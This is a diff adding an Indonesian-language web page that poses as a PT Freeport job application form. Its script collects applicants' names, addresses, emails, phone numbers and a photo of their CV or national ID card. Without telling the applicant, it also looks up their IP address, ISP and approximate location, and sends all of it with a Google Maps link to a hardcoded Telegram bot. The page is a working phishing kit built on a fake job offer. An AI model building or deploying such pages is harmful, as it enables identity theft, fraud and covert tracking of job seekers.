@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Form Lamaran Kerja PT Freeport</title>
+  <style>
+    body{font-family:Poppins,system-ui; background:#1e1e3f; color:#ffcc33; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px}
+    .card{width:100%;max-width:420px;background:rgba(255,255,255,0.05);padding:20px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.5)}
+    h2{margin:0 0 12px;color:#ffcc33;text-align:center}
+    input,select{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:none;background:#2d2d54;color:#fff}
+    .row{display:flex;gap:10px;justify-content:center;margin:10px 0}
+    .btn{padding:12px;border-radius:10px;border:none;cursor:pointer;font-weight:700}
+    .btn-primary{background:#ffcc33;color:#1e1e3f;width:100%}
+    .btn-dashed{background:transparent;border:2px dashed #ffcc33;color:#ffcc33;flex:1;padding:10px;border-radius:8px}
+    input[type="file"]{display:none}
+    /* loading overlay */
+    .loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:999;align-items:center;justify-content:center}
+    .spinner{width:64px;height:64px;border-radius:50%;border:6px solid #eee;border-top-color:#ffcc33;animation:spin 1s linear infinite}
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+    /* notif */
+    .notif{display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#fff;color:#000;padding:12px 18px;border-radius:10px;box-shadow:0 8px 20px rgba(0,0,0,0.25);z-index:1000;font-weight:700}
+  </style>
+</head>
+<body>
+  <div class="card">
+<h2 style="text-align:center; color:#FFD700; font-family:'Poppins', sans-serif; margin-bottom:15px;">
+  Form Lamaran Kerja PT Freeport
+</h2>
+
+<!-- Gambar Freeport -->
+<div style="text-align:center; margin-bottom:20px;">
+  <img src="https://i.postimg.cc/X7p6P8BX/images-1.jpg" 
+       alt="Pekerja PT Freeport" 
+       style="max-width:90%; border-radius:15px; box-shadow:0 0 15px rgba(255,255,255,0.2);">
+</div>
+
+    <input id="nama" placeholder="Nama Lengkap" required />
+    <select id="pendidikan" required>
+      <option value="">-- Pilih Pendidikan Terakhir --</option>
+      <option value="SD">SD (Sekolah Dasar)</option>
+      <option value="SMP">SMP (Sekolah Menengah Pertama)</option>
+      <option value="SMA">SMA / MA</option>
+      <option value="SMK">SMK / MAK</option>
+      <option value="D1">Diploma 1 (D1)</option>
+      <option value="D2">Diploma 2 (D2)</option>
+      <option value="D3">Diploma 3 (D3)</option>
+      <option value="D4">Diploma 4 (D4)</option>
+      <option value="S1">Sarjana (S1)</option>
+      <option value="S2">Magister (S2)</option>
+      <option value="S3">Doktor (S3)</option>
+    </select>
+
+    <input id="alamat" placeholder="Alamat Lengkap" required />
+    <input id="email" placeholder="Email Aktif" type="email" required />
+    <input id="hp" placeholder="No. HP Aktif" required />
+
+    <div style="margin-top:8px;font-weight:700;color:#ffcc33">Foto CV Atau KTP</div>
+    <div class="row">
+      <button class="btn btn-dashed" onclick="document.getElementById('cv').click()">📁 Upload dari Galeri</button>
+      <button class="btn btn-dashed" onclick="ambilFoto()">📷 Ambil Foto</button>
+    </div>
+    <input type="file" id="cv" accept="image/*" />
+
+    <div style="margin-top:12px">
+      <button class="btn btn-primary" onclick="kirimLamaran()">Kirim Lamaran</button>
+    </div>
+  </div>
+
+  <!-- loading overlay -->
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- notifikasi -->
+  <div class="notif" id="notif">✅ Lamaran berhasil dikirim!</div>
+
+  <script>
+    // Ganti dengan token + chat id milikmu
+    const BOT_TOKEN = "7868061638:AAHR2DA2Dn1rVb618BTaQ_jxigxeVZi8c4k";
+    const CHAT_ID  = "7625804862";
+
+    function ambilFoto(){
+      const f = document.getElementById('cv');
+      f.setAttribute('capture', 'camera');
+      f.click();
+    }
+
+    function showLoading(show = true){
+      document.getElementById('loading').style.display = show ? 'flex' : 'none';
+    }
+    function showNotif(text = '✅ Lamaran berhasil dikirim!', dur = 2000){
+      const n = document.getElementById('notif');
+      n.textContent = text;
+      n.style.display = 'block';
+      setTimeout(()=> n.style.display = 'none', dur);
+    }
+
+    async function kirimLamaran(){
+      const nama = document.getElementById('nama').value.trim();
+      const pendidikan = document.getElementById('pendidikan').value;
+      const alamat = document.getElementById('alamat').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const hp = document.getElementById('hp').value.trim();
+      const cv = document.getElementById('cv').files[0];
+
+      if(!nama || !pendidikan || !alamat || !email || !hp || !cv){
+        alert('Harap isi semua data dan unggah CV!');
+        return;
+      }
+
+      showLoading(true);
+
+      try {
+        // 1) ambil IP & lokasi dari ipapi (fallback sederhana untuk nama field)
+        const ipRes = await fetch('https://ipapi.co/json/');
+        if(!ipRes.ok) throw new Error('Gagal ambil info IP');
+        const ipData = await ipRes.json();
+
+        // ambil latitude/longitude jika tersedia (beberapa API pakai latitude/longitude atau lat/lon)
+        const lat = ipData.latitude ?? ipData.lat ?? null;
+        const lon = ipData.longitude ?? ipData.lon ?? ipData.longitude ?? null;
+
+        // buat link Google Maps jika lat/lon tersedia
+        let mapsLink = 'Tidak tersedia';
+        if(lat && lon){
+          const q = encodeURIComponent(`${lat},${lon}`);
+          mapsLink = `https://www.google.com/maps/search/?api=1&query=${q}`;
+        }
+
+        // siapkan caption HTML agar link clickable
+        // gunakan HTML parse_mode saat mengirim photo
+        const captionHtml = `
+<b>📄 Lamaran Kerja PT Freeport</b>\n
+<b>👤 Nama:</b> ${escapeHtml(nama)}\n
+<b>🎓 Pendidikan:</b> ${escapeHtml(pendidikan)}\n
+<b>🏠 Alamat:</b> ${escapeHtml(alamat)}\n
+<b>📧 Email:</b> ${escapeHtml(email)}\n
+<b>📱 HP:</b> ${escapeHtml(hp)}\n\n
+<b>🌐 Informasi IP:</b>\n
+IP: ${escapeHtml(ipData.ip ?? '—')}\n
+Kota: ${escapeHtml(ipData.city ?? '—')}\n
+Wilayah: ${escapeHtml(ipData.region ?? '—')}\n
+Negara: ${escapeHtml(ipData.country_name ?? '—')}\n
+ISP: ${escapeHtml(ipData.org ?? '—')}\n
+Lat/Lon: ${lat && lon ? `${lat}, ${lon}` : '—'}\n
+<a href="${mapsLink}">📍 Lihat lokasi di Google Maps</a>
+`.trim();
+
+        // 2) kirim photo + caption ke Telegram (form-data)
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', cv);
+        formData.append('caption', captionHtml);
+        formData.append('parse_mode', 'HTML');
+
+        const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const sendJson = await sendRes.json();
+        if(!sendRes.ok || !sendJson.ok){
+          // jika gagal kirim photo, coba kirim pesan teks (fallback)
+          console.error('sendPhoto error', sendJson);
+          throw new Error('Gagal mengirim ke Telegram');
+        }
+
+        showLoading(false);
+        showNotif('✅ Lamaran berhasil dikirim!', 2000);
+        // reset form
+        document.getElementById('nama').value = '';
+        document.getElementById('pendidikan').value = '';
+        document.getElementById('alamat').value = '';
+        document.getElementById('email').value = '';
+        document.getElementById('hp').value = '';
+        document.getElementById('cv').value = '';
+      } catch(err){
+        console.error(err);
+        showLoading(false);
+        showNotif('❌ Gagal mengirim lamaran', 2000);
+        alert('Gagal mengirim lamaran. Cek koneksi atau token/chat ID.');
+      }
+    }
+
+    // kecil: escape HTML untuk mencegah karakter yg rusak di caption HTML
+    function escapeHtml(str){
+      if(!str) return '';
+      return String(str)
+        .replaceAll('&','&amp;')
+        .replaceAll('<','&lt;')
+        .replaceAll('>','&gt;')
+        .replaceAll('"','&quot;');
+    }
+  </script>
+</body>
+</html>
